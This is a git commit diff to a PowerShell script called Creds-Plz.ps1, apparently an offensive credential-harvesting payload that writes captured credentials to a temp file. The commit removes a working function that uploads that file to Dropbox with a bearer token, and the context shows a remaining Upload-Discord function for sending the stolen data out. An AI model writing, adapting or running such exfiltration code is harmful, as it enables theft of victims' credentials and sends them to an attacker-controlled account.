9d074d1402e3047b109d55c7a4357ed4d58640c6
Eve <35784752+benalec@users.noreply.github.com>
2024-01-03 14:37:08 -0500

    Update Creds-Plz.ps1

--- Creds-Plz.ps1
+++ Creds-Plz.ps1
@@ -159,36 +159,6 @@ echo $creds >> $env:TMP\$FileName
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-<#
-
-.NOTES 
-	This is to upload your files to dropbox
-#>
-
-function DropBox-Upload {
-
-[CmdletBinding()]
-param (
-	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-[string]$SourceFilePath
-) 
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$FileName}
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
 function Upload-Discord {
 
 [CmdletBinding()]
